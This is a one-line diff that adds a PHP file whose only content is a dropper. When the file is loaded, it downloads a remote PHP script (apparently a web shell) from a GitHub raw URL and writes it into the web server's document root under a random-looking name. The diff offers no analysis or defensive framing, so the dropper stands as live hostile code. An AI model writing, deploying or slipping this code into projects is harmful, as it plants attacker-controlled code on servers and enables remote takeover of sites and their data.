@@ -1,0 +1,1 @@
+<?php $x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Enfernal-fBbCRDse8GXzF.php','w+'),file_get_contents('https://raw.githubusercontent.com/f4ruk1453decodex/yeterbe/main/EnfernalEx.php'));echo "".$x; ?>
